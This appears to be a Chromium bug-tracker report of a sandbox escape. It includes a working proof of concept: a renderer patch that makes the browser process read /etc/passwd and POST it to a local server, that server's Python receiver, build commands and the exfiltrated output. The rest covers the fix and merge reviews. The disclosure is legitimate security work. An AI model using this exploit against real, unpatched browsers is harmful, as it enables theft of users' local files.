# Sandbox Escape: Arbitrary Local File Read via Missing CanReadRequestBody Validation in CreateNewWindow's opener_suppressed Path

| Field | Value |
|-------|-------|
| **Issue ID** | [487768779](https://issues.chromium.org/issues/487768779) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | cr...@chromium.org |
| **Created** | 2026-02-26 |
| **Bounty** | $26,000.00 |

## Description

# Sandbox Escape: Arbitrary Local File Read via Missing CanReadRequestBody Validation in CreateNewWindow's opener\_suppressed Path

## Summary

A compromised renderer process can read and exfiltrate arbitrary local files by exploiting a missing security validation in the `CreateNewWindow` IPC handler. When `opener_suppressed` is true, the browser process directly uses the renderer-provided `form_submission_post_data` to initiate a POST navigation without calling `CanReadRequestBody()`. Because the resulting network request is attributed to the browser process (`process_id == 0`), the file upload security check in `HandleFileUploadRequest` is bypassed entirely, allowing an attacker to read any file on the local filesystem and exfiltrate it to an attacker-controlled URL. Additionally, the browser trusts the renderer-provided `allow_popup` field without verification, enabling the compromised renderer to bypass the popup blocker without any user gesture. This constitutes a full sandbox escape, as demonstrated by successfully exfiltrating `/etc/passwd` (3126 bytes) to an attacker-controlled HTTP server with the sandbox enabled and no special flags.

## Bisect

Introducing Commit: `5de823b36e68fd99009a29281b17bc3a1d6b329c`

- Date: `Tue Jun 14 04:37:50 2022`
- Author: `jongdeok.kim <jongdeok.kim@navercorp.com>`
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/3587952>

The commit "Support rel attribute for form element" added support for `<form rel="noopener">`, which requires passing POST data through the `opener_suppressed` branch of `CreateNewWindow`. The seven lines that populate `load_params->post_data` from renderer-supplied `params.form_submission_post_data` were added without the corresponding `CanReadRequestBody()` security check that exists in every other renderer-initiated navigation path.

## Root Cause

The Mojo interface `content.mojom.FrameHost::CreateNewWindow` accepts a `CreateNewWindowParams` structure from the renderer process. This structure includes a `form_submission_post_data` field of type `network.mojom.URLRequestBody`, which can contain `DataElementFile` entries specifying arbitrary filesystem paths.

```
// content/common/frame.mojom — CreateNewWindowParams
struct CreateNewWindowParams {
  ...
  // Body of HTTP POST request for form submission.
  network.mojom.URLRequestBody? form_submission_post_data;
  string form_submission_post_content_type;
  ...
};

```

When a renderer invokes `CreateNewWindow` with `opener_suppressed == true`, the browser-side handler in `WebContentsImpl::CreateNewWindow` enters a special branch that navigates the newly created window directly from the browser process. In this branch, the renderer-provided POST data is assigned directly to the navigation parameters without any validation:

```
// content/browser/web_contents/web_contents_impl.cc — WebContentsImpl::CreateNewWindow
if (params.form_submission_post_data) {
  load_params->load_type = NavigationController::LOAD_TYPE_HTTP_POST;
  load_params->post_data = params.form_submission_post_data;  // no validation
  load_params->post_content_type = params.form_submission_post_content_type;
}
...
contents_to_load->GetController().LoadURLWithParams(*load_params.get());

```

By contrast, both of the other renderer-initiated navigation paths that accept POST data validate it before use. The `OpenURL` path calls `VerifyOpenURLParams`, and the `BeginNavigation` path calls `VerifyBeginNavigationCommonParams`. Both of these functions invoke `ChildProcessSecurityPolicyImpl::CanReadRequestBody()`, which iterates through every `DataElement` in the request body, rejects any `DataElementFile` whose path the renderer is not authorized to read, and terminates the renderer with a `bad_message::ILLEGAL_UPLOAD_PARAMS` report if the check fails:

```
// content/browser/renderer_host/ipc_utils.cc — VerifyOpenURLParams
auto* policy = ChildProcessSecurityPolicyImpl::GetInstance();
if (!policy->CanReadRequestBody(process, params->post_body)) {
  bad_message::ReceivedBadMessage(process,
                                  bad_message::ILLEGAL_UPLOAD_PARAMS);
  return false;
}

```

The `CreateNewWindow` path lacks this check entirely.

The consequence is escalated by how the browser handles the resulting navigation. Because `opener_suppressed` navigations are browser-driven, `NavigationURLLoaderImpl` constructs the `URLLoaderFactoryParams` with `process_id` set to `OriginatingProcessId::browser()`, which resolves to `0`:

```
// content/browser/loader/navigation_url_loader_impl.cc
params->process_id = network::OriginatingProcessId::browser();

```

When the Network Service encounters `DataElementFile` entries in the request body, it calls `NetworkContextClient::OnFileUploadRequested`, which routes to `HandleFileUploadRequest` in the browser process. This function checks whether the originating process is allowed to read each file path, but it explicitly exempts the browser process (process\_id == 0) from this check:

```
// content/browser/network_context_client_base_impl.cc — HandleFileUploadRequest
if (process_id != network::mojom::kBrowserProcessId &&
    !cpsp->CanReadFile(ChildProcessId::FromUnsafeValue(process_id),
                       file_path)) {
  // deny
  return;
}
// If process_id == kBrowserProcessId (0), the check is skipped entirely
files.emplace_back(file_path, file_flags);

```

A secondary issue compounds the exploit: the browser trusts the `allow_popup` field in `CreateNewWindowParams` without verification. In `RenderFrameHostImpl::CreateNewWindow`, the popup blocker decision is computed as:

```
// content/browser/renderer_host/render_frame_host_impl.cc
bool effective_transient_activation_state =
    params->allow_popup || HasTransientUserActivation() ||
    (transient_allow_popup_.IsActive() &&
     params->disposition == WindowOpenDisposition::NEW_POPUP);

```

A compromised renderer can set `allow_popup = true` to bypass the popup blocker entirely, without requiring any user gesture or transient activation. Combined with `opener_suppressed = true`, this allows the compromised renderer to trigger the file exfiltration at any time, without user interaction.

The net effect is a confused deputy attack: the compromised renderer provides an arbitrary file path via the `CreateNewWindow` Mojo message, the browser process trusts and forwards this to the navigation system, the navigation system attributes the request to the browser itself, and the file upload handler opens the file with full browser-process privileges. The file contents are then sent as the POST body to the renderer-specified `target_url`, completing the exfiltration.

## Reproduce

The proof of concept consists of three components: a patch to the renderer process that simulates a compromised renderer directly calling `FrameHost::CreateNewWindow()` via Mojo IPC with a `DataElementFile` injected into the POST body, an HTML trigger page, and a Python HTTP server that receives the exfiltrated file. The compromised renderer bypasses Blink's popup blocker entirely by setting `allow_popup = true` in the Mojo message, so no `--disable-popup-blocking` flag is needed.

Apply the following patch to the renderer (tested on `d0f83d769eeed`, `git apply createnewwindow-file-exfil-poc/render_frame_impl.patch`):

```
diff --git a/content/renderer/render_frame_impl.cc b/content/renderer/render_frame_impl.cc
index dd17c9c1d3d17..4887300ab9b22 100644
--- a/content/renderer/render_frame_impl.cc
+++ b/content/renderer/render_frame_impl.cc
@@ -134,6 +134,8 @@
 #include "net/http/http_util.h"
 #include "services/metrics/public/cpp/ukm_source_id.h"
 #include "services/network/public/cpp/content_decoding_interceptor.h"
+#include "services/network/public/cpp/resource_request_body.h"
+#include "third_party/blink/public/common/dom_storage/session_storage_namespace_id.h"
 #include "services/network/public/cpp/features.h"
 #include "services/network/public/cpp/not_implemented_url_loader_factory.h"
 #include "services/network/public/cpp/weak_wrapper_shared_url_loader_factory.h"
@@ -4167,6 +4169,87 @@ void RenderFrameImpl::DidFinishLoad() {
                          frame_->IsOutermostMainFrame());
   }

+  // --- PoC: Direct Mojo IPC to CreateNewWindow ---
+  // A compromised renderer calls FrameHost::CreateNewWindow() directly,
+  // bypassing Blink's popup blocker entirely. The browser trusts
+  // allow_popup from the renderer and skips activation checks.
+  // No --disable-popup-blocking needed.
+  std::string url = frame_->GetDocument().Url().GetString().Utf8();
+  if (!frame_->Parent() && url.find("/trigger") != std::string::npos) {
+    LOG(ERROR) << "POC: Direct Mojo CreateNewWindow - no popup blocker, "
+               << "no user gesture needed";
+
+    auto params = mojom::CreateNewWindowParams::New();
+
+    // allow_popup=true bypasses browser-side popup blocker:
+    //   effective_transient_activation_state =
+    //       params->allow_popup || HasTransientUserActivation() || ...
+    // Browser trusts this field from renderer without verification.
+    params->allow_popup = true;
+    params->opener_suppressed = true;
+    params->is_form_submission = true;
+    params->target_url = GURL("http://127.0.0.1:9999/exfil");
+    params->disposition = WindowOpenDisposition::NEW_FOREGROUND_TAB;
+    params->form_submission_post_content_type = "application/octet-stream";
+    params->session_storage_namespace_id =
+        blink::AllocateSessionStorageNamespaceId();
+
+    // Required non-optional struct fields
+    params->referrer = blink::mojom::Referrer::New(
+        GURL(), network::mojom::ReferrerPolicy::kDefault);
+    params->features = blink::mojom::WindowFeatures::New();
+    // download_policy is a typemapped plain struct, default-initialized.
+
+    // === THE EXPLOIT ===
+    // Inject DataElementFile pointing to /etc/passwd.
+    // The opener_suppressed=true path navigates the new window directly
+    // from the browser process via LoadURLWithParams(), which does NOT
+    // call CanReadRequestBody(). The network service reads /etc/passwd
+    // and sends it as POST body to the attacker's server.
+    auto body = base::MakeRefCounted<network::ResourceRequestBody>();
+    body->AppendFileRange(
+        base::FilePath(FILE_PATH_LITERAL("/etc/passwd")),
+        0, 1048576, base::Time());
+    params->form_submission_post_data = std::move(body);
+
+    LOG(ERROR) << "POC: target=http://127.0.0.1:9999/exfil file=/etc/passwd";
+
+    // Create required Mojo endpoints for the new window
+    mojo::PendingAssociatedReceiver<mojom::Frame> frame_receiver;
+    params->frame_remote =
+        frame_receiver.InitWithNewEndpointAndPassRemote();
+    mojo::PendingAssociatedReceiver<blink::mojom::PageBroadcast>
+        page_broadcast_receiver;
+    params->page_broadcast_remote =
+        page_broadcast_receiver.InitWithNewEndpointAndPassRemote();
+    mojo::PendingRemote<blink::mojom::BrowserInterfaceBroker>
+        browser_interface_broker;
+    params->main_frame_interface_broker =
+        browser_interface_broker.InitWithNewPipeAndPassReceiver();
+    mojo::PendingAssociatedRemote<blink::mojom::AssociatedInterfaceProvider>
+        aip_remote;
+    params->associated_interface_provider =
+        aip_remote.InitWithNewEndpointAndPassReceiver();
+    mojo::PendingAssociatedRemote<blink::mojom::WidgetHost> wh_remote;
+    params->widget_host = wh_remote.InitWithNewEndpointAndPassReceiver();
+    mojo::PendingAssociatedReceiver<blink::mojom::Widget> w_receiver;
+    params->widget = w_receiver.InitWithNewEndpointAndPassRemote();
+    mojo::PendingAssociatedRemote<blink::mojom::FrameWidgetHost> fwh_remote;
+    params->frame_widget_host =
+        fwh_remote.InitWithNewEndpointAndPassReceiver();
+    mojo::PendingAssociatedReceiver<blink::mojom::FrameWidget> fw_receiver;
+    params->frame_widget = fw_receiver.InitWithNewEndpointAndPassRemote();
+
+    // Direct Mojo call - no Blink, no JS, no popup blocker
+    mojom::CreateNewWindowStatus status;
+    mojom::CreateNewWindowReplyPtr reply;
+    GetFrameHost()->CreateNewWindow(std::move(params), &status, &reply);
+    LOG(ERROR) << "POC: CreateNewWindow status="
+               << static_cast<int>(status)
+               << " (0=Blocked,1=Ignore,2=Reuse,3=Success)";
+  }
+  // --- End PoC ---
+
   for (auto& observer : observers_)
     observer.DidFinishLoad();
 }

```

Save the following as `trigger.html`:

```
<!DOCTYPE html>
<html>
<head><title>CreateNewWindow File Exfil PoC</title></head>
<body>
<h1>CreateNewWindow File Exfiltration PoC</h1>
<p>This page triggers the exploit via its URL path containing "/trigger".</p>
<p>The compromised renderer (patched render_frame_impl.cc) will:</p>
<ol>
  <li>Detect "/trigger" in the URL at DidFinishLoad()</li>
  <li>Call FrameHost::CreateNewWindow() directly via Mojo IPC</li>
  <li>Set allow_popup=true to bypass popup blocker (no user gesture needed)</li>
  <li>Set opener_suppressed=true to skip CanReadRequestBody() check</li>
  <li>Inject DataElementFile("/etc/passwd") as POST body</li>
  <li>Browser process reads /etc/passwd and POSTs it to 127.0.0.1:9999/exfil</li>
</ol>
<p>Check the poc_server.py terminal for exfiltrated file content.</p>
</body>
</html>

```

Save the following as `poc_server.py`:

```
#!/usr/bin/env python3
"""
CreateNewWindow File Exfiltration - Receiving Server

Listens on port 9999. When Chrome's browser process navigates the new tab
to http://127.0.0.1:9999/exfil with the POST body containing /etc/passwd,
this server captures and displays the exfiltrated file content.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import sys


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path.endswith(".html"):
            try:
                with open("trigger.html", "rb") as f:
                    content = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"ok")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""

        sys.stderr.write(f"\n{'='*70}\n")
        sys.stderr.write(f"[EXFIL] POST {self.path}\n")
        sys.stderr.write(f"[EXFIL] Content-Length: {content_length}\n")
        sys.stderr.write(f"[EXFIL] Content-Type: {self.headers.get('Content-Type', 'N/A')}\n")
        sys.stderr.write(f"[EXFIL] Body ({len(body)} bytes):\n")
        sys.stderr.write(f"{'-'*70}\n")
        try:
            sys.stderr.write(body.decode("utf-8", errors="replace"))
            sys.stderr.write("\n")
        except Exception:
            sys.stderr.write(f"(binary data: {body[:200]}...)\n")
        sys.stderr.write(f"{'='*70}\n")
        sys.stderr.flush()

        if len(body) > 0 and b":" in body:
            sys.stderr.write("\n[!!!] SUCCESS: File content received!\n")
            sys.stderr.write("[!!!] The /etc/passwd content was exfiltrated via browser process!\n")
            with open("exfil_result.txt", "wb") as f:
                f.write(body)
            sys.stderr.write("[!!!] Saved to exfil_result.txt\n")
            sys.stderr.flush()

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"received")

    def log_message(self, format, *args):
        sys.stderr.write(f"[SERVER] {format % args}\n")
        sys.stderr.flush()


if __name__ == "__main__":
    port = 9999
    server = HTTPServer(("127.0.0.1", port), Handler)
    sys.stderr.write(f"[*] Exfil Server listening on http://127.0.0.1:{port}\n")
    sys.stderr.write(f"[*] Waiting for exfiltrated file content on POST /exfil ...\n")
    sys.stderr.flush()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        sys.stderr.write("\n[*] Server stopped.\n")
        server.server_close()

```

Build and run:

```
# Build with the renderer patch applied
autoninja -C out/asan-release chrome

# Terminal 1: start the exfil server (serves both trigger.html and receives exfil)
cd <poc-directory>
python3 poc_server.py

# Terminal 2: launch Chrome (sandbox enabled, no --no-sandbox, no --disable-popup-blocking)
ASAN_OPTIONS=detect_odr_violation=0 xvfb-run -a out/asan-release/chrome \
  --disable-gpu \
  --user-data-dir=/tmp/poc-$(date +%s) \
  --enable-logging=stderr \
  http://127.0.0.1:9999/trigger.html

```

Chrome stderr output confirms the renderer-side injection and successful bypass of the popup blocker without user gesture:

```
[189594:1:0226/204157.261511:ERROR:content/renderer/render_frame_impl.cc:4179] POC: Direct Mojo CreateNewWindow - no popup blocker, no user gesture needed
[189594:1:0226/204157.261861:ERROR:content/renderer/render_frame_impl.cc:4213] POC: target=http://127.0.0.1:9999/exfil file=/etc/passwd
[189594:1:0226/204157.305287:ERROR:content/renderer/render_frame_impl.cc:4245] POC: CreateNewWindow status=1 (0=Blocked,1=Ignore,2=Reuse,3=Success)

```

The `kIgnore` status (1) is expected: the browser creates and navigates the new window but does not inform the renderer about it because `opener_suppressed` causes a new BrowsingInstance. The window creation and navigation proceed regardless.

The exfil server receives the full contents of `/etc/passwd` as the POST body:

```
[SERVER] "POST /exfil HTTP/1.1" 200 -

======================================================================
[EXFIL] POST /exfil
[EXFIL] Content-Length: 3126
[EXFIL] Content-Type: application/octet-stream
[EXFIL] Body (3126 bytes):
----------------------------------------------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
sshd:x:131:65534::/run/sshd:/usr/sbin/nologin
======================================================================

[!!!] SUCCESS: File content received!
[!!!] The /etc/passwd content was exfiltrated via browser process!
[!!!] Saved to exfil_result.txt

```

The test was conducted with the sandbox enabled (no `--no-sandbox` flag) and without `--disable-popup-blocking`, confirming that this vulnerability is reachable from within a sandboxed renderer process without any user interaction.

## Credit

c6eed09fc8b174b0f3eebedcceb1e792

## Attachments

- [readme.md](attachments/readme.md) (text/markdown, 2.2 KB)
- [poc_server.py](attachments/poc_server.py) (text/x-python, 1.8 KB)
- [trigger.html](attachments/trigger.html) (text/html, 804 B)
- [render_frame_impl.patch](attachments/render_frame_impl.patch) (text/x-diff, 5.0 KB)
- [reproduce.sh](attachments/reproduce.sh) (text/x-sh, 8.8 KB)

## Timeline

### aj...@google.com (2026-02-27)

I've not reproduced this but it seems feasible and the patch is renderer only. Thanks for attaching files to this report!

### aj...@google.com (2026-02-27)

Adding folks from [issue 41440869](https://issues.chromium.org/issues/41440869) that discussed introducing this feature.

### ch...@google.com (2026-02-28)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-28)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must exceed severity.

### cr...@chromium.org (2026-03-05)

Thanks for the report! I'm guessing Arthur is familiar with this from [issue 41440869](https://issues.chromium.org/issues/41440869), but I've also just done a similar fix for [issue 487383169](https://issues.chromium.org/issues/487383169) (and alexmos@ did another similar one for [issue 487471101](https://issues.chromium.org/issues/487471101)), so I may be able to help.

I have repro'd the bug locally to confirm it, and I have a fix in progress that introduces a `VerifyCreateNewWindowParams` function with a `CanReadRequestBody` call. We can move the other validation into that function and ensure it covers all the parameters as a followup.

Note: There are some pre-existing ILLEGAL\_UPLOAD\_PARAMS renderer kill [reports](https://crash.corp.google.com/browse?q=product_name+IN+%28%27AndroidWebView%27%2C%27Chrome%27%2C%27Chrome_Android%27%2C%27Chrome_ChromeOS%27%2C%27Chrome_Linux%27%2C%27Chrome_Mac%27%2C%27Chrome_iOS%27%2C%27Chrome_iOS_MetricKit%27%29+AND+expanded_custom_data.ChromeCrashProto.magic_signature_1.name+LIKE+%27%25%5BRenderer+kill+170%5D%25%27#productname:1000,productversion:1000,chromemilestone:100,+magicsignature:300,magicsignature2:50,stablesignature:100,clientid:100,uploaddateutc:100,url:100,runningfinchexperiments:100) that would have a similar `[Renderer kills 170]` magic signature. We should be able to distinguish the existing ones from any new ones in `content::VerifyCreateNewWindowParams` based on the magic signature, but whatever is causing the other reports could lead to some false positive renderer kills here as well. We certainly need this validation in CreateNewWindow, though, and hopefully all such `CanReadRequestBody` false positives will have a common fix that can be found.

Arthur, feel free to take a look at the draft fix at <https://chromium-review.googlesource.com/c/chromium/src/+/7635726> while I'm offline and the try jobs run. Thanks!

### je...@gmail.com (2026-03-05)

Hi, I'm curious if 487383169 and 487471101 are also externally reported security vulnerabilities or just functional fixes.

### aj...@google.com (2026-03-05)

You will have to wait and see...

### ar...@chromium.org (2026-03-05)

Thanks! This is a well written report!

I reproduced and I verified @cr...@chromium.org [fix](https://chromium-review.googlesource.com/c/chromium/src/+/7635726):

**Before fix:**

```
[*] Launching Chrome to trigger the exploit...
======================================================================
[EXFIL] POST /exfil
[EXFIL] Content-Length: <redacted>
[EXFIL] Body (<redacted> bytes):
----------------------------------------------------------------------
<redacted>
======================================================================
[!!!] SUCCESS: File content received!
[!!!] Saved to createnewwindow-file-exfil-poc/exfil_result.txt

```

**After fix**

```
[*] Launching Chrome to trigger the exploit...
[2726254:2726254:0305/101530.035807:WARNING:chrome/browser/ui/sad_tab.cc:256] Tab Killed: http://127.0.0.1:9999/

```

(adding reproduce.sh for reproducing all of this as a one-liner)

### dx...@google.com (2026-03-05)

Project: chromium/src  

Branch:  main  

Author:  Charlie Reis [creis@chromium.org](mailto:creis@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7635726>

Validate ResourceRequestBody in CreateNewWindowParams.

---


Expand for full commit details
```
     
    Bug: 487768779 
    Change-Id: I15b89c501cc386ec6dee7eb3dbaab4a4cb6d0068 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635726 
    Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org> 
    Commit-Queue: Charlie Reis <creis@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1594735}

```

---

Files:

- M `content/browser/renderer_host/ipc_utils.cc`
- M `content/browser/renderer_host/ipc_utils.h`
- M `content/browser/renderer_host/render_frame_host_impl.cc`
- M `content/browser/renderer_host/render_frame_host_impl.h`
- M `content/browser/security_exploit_browsertest.cc`

---

Hash: [b496550e39c5c1752d504a684ebc4d88b4009ed3](https://chromiumdash.appspot.com/commit/b496550e39c5c1752d504a684ebc4d88b4009ed3)  

Date: Thu Mar 5 16:59:03 2026


---

### cr...@chromium.org (2026-03-05)

Thanks for verifying it, Arthur! Just landed the fix, so I'll assign the bug to me and close it. We can address merges once we see how it does on Canary.

### ch...@google.com (2026-03-06)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1594735) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1594735) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1594735) appears to be after beta branch point (1582197).
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### ch...@google.com (2026-03-06)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-06)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-03-06)

Merge review required: M144 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: alonbajayo (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### cr...@chromium.org (2026-03-06)

Risk analysis for [#comment12](https://issues.chromium.org/issues/487768779#comment12): The fix is a reasonably straightforward use of an existing validation function for a new parameter, and should not pose much risk. We can't manually verify that the attack is blocked without a compromised renderer, but the fix includes an automated test for this. Based on the notes below, I don't see stability concerns with merging the fix so far.

> Which CLs should be backmerged? (Please include Gerrit links.)

<https://chromium-review.googlesource.com/c/chromium/src/+/7635726>

> Has this fix been verified on Canary to not pose any stability regressions?

The fix landed in 147.0.7721.0.

Stability regressions from this change would look like new renderer kills when a web page posts a form submission in a popup. So far, there are zero such [Renderer kill 170 reports in 147.0.7721.0+](https://crash.corp.google.com/browse?q=product_name+IN+%28%27AndroidWebView%27%2C%27Chrome%27%2C%27Chrome_Android%27%2C%27Chrome_ChromeOS%27%2C%27Chrome_Linux%27%2C%27Chrome_Mac%27%2C%27Chrome_iOS%27%2C%27Chrome_iOS_MetricKit%27%29+AND+expanded_custom_data.ChromeCrashProto.magic_signature_1.name+LIKE+%27%25%5BRenderer+kill+170%5D%25%27+AND+ComparableVersion%28product.version%29+%3E%3D+ComparableVersion%28%27147.0.7721.0%27%29#productname:1000,productversion:1000,chromemilestone:100,+magicsignature:300,magicsignature2:50,stablesignature:100,clientid:100,uploaddateutc:100,url:100,runningfinchexperiments:100), although that version has only been live for a few hours.

As noted in [#comment6](https://issues.chromium.org/issues/487768779#comment6), there are [pre-existing Renderer kill 170 reports](https://crash.corp.google.com/browse?q=product_name+IN+%28%27AndroidWebView%27%2C%27Chrome%27%2C%27Chrome_Android%27%2C%27Chrome_ChromeOS%27%2C%27Chrome_Linux%27%2C%27Chrome_Mac%27%2C%27Chrome_iOS%27%2C%27Chrome_iOS_MetricKit%27%29+AND+expanded_custom_data.ChromeCrashProto.magic_signature_1.name+LIKE+%27%25%5BRenderer+kill+170%5D%25%27#productname:1000,productversion:1000,chromemilestone:100,magicsignature:300,magicsignature2:50,stablesignature:100,clientid:100,uploaddateutc:100,url:100,runningfinchexperiments:100), which could appear in the new results without indicating a new regression. These existing cases are due to unrelated, undiagnosed reasons, possibly related to [issue 40275612](https://issues.chromium.org/issues/40275612).

> Does this fix pose any potential non-verifiable stability risks?

If the fix does cause stability regressions, they will very likely appear in the crash signature linked above. I don't think there are any non-verifiable stability risks from the fix.

> Does this fix pose any known compatibility risks?

If the fix has a bug, it could cause some legitimate file upload cases to fail. However, all of those cases would appear as renderer kills in the crash database, so we would see evidence if they occur.

> Does it require manual verification by the test team? If so, please describe required testing.

There are automated web tests for the affected feature introduced in <https://chromium-review.googlesource.com/c/chromium/src/+/3587952>, so I don't think manual testing is required.

> (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

Confirmed.

### cr...@chromium.org (2026-03-06)

Re: [#comment13](https://issues.chromium.org/issues/487768779#comment13) merge review questions:

> Why does your merge fit within the merge criteria for these milestones?

It fixes a high-severity security issue.

> What changes specifically would you like to merge? Please link to Gerrit.

<https://chromium-review.googlesource.com/c/chromium/src/+/7635726>

> Have the changes been released and tested on canary?

Yes. See [#comment16](https://issues.chromium.org/issues/487768779#comment16) for stability analysis.

> Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?

No. The [affected feature](https://chromium-review.googlesource.com/c/chromium/src/+/3587952) landed in 2022.

> [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>

N/A

> If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

No, per [#comment16](https://issues.chromium.org/issues/487768779#comment16).

### dr...@chromium.org (2026-03-07)

Thanks for giving the crash queries! Still no crashes and the build has been live for 24 hours, so approving merge to M146. We don't plan more M144 or M145 releases, so no merge needed there.

### cr...@chromium.org (2026-03-09)

Thanks! I'm resolving some trivial merge conflicts in the M146 branch and I'll upload the merge CL soon.

### dx...@google.com (2026-03-09)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Charlie Reis [creis@chromium.org](mailto:creis@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7647963>

[M146] Validate ResourceRequestBody in CreateNewWindowParams.

---


Expand for full commit details
```
     
    (cherry picked from commit b496550e39c5c1752d504a684ebc4d88b4009ed3) 
     
    Bug: 487768779 
    Change-Id: I8c1c6f6f6ab4584decc94fe590bf335c699c14fa 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7635726 
    Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org> 
    Commit-Queue: Charlie Reis <creis@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1594735} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7647963 
    Cr-Commit-Position: refs/branch-heads/7680@{#2212} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `content/browser/renderer_host/ipc_utils.cc`
- M `content/browser/renderer_host/ipc_utils.h`
- M `content/browser/renderer_host/render_frame_host_impl.cc`
- M `content/browser/renderer_host/render_frame_host_impl.h`
- M `content/browser/security_exploit_browsertest.cc`

---

Hash: [266446f6bbbda1182dc46fd9cbe09b6e0281418b](https://chromiumdash.appspot.com/commit/266446f6bbbda1182dc46fd9cbe09b6e0281418b)  

Date: Mon Mar 9 17:55:25 2026


---

### pe...@google.com (2026-03-09)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### cr...@chromium.org (2026-03-09)

Re: [#comment21](https://issues.chromium.org/issues/487768779#comment21):

> Was this issue a regression for the milestone it was found in?

No. Per [#comment17](https://issues.chromium.org/issues/487768779#comment17), we think the bug was introduced in 2022.

> Is this issue related to a change or feature merged after the latest LTS Milestone?

No.

### pe...@google.com (2026-03-11)

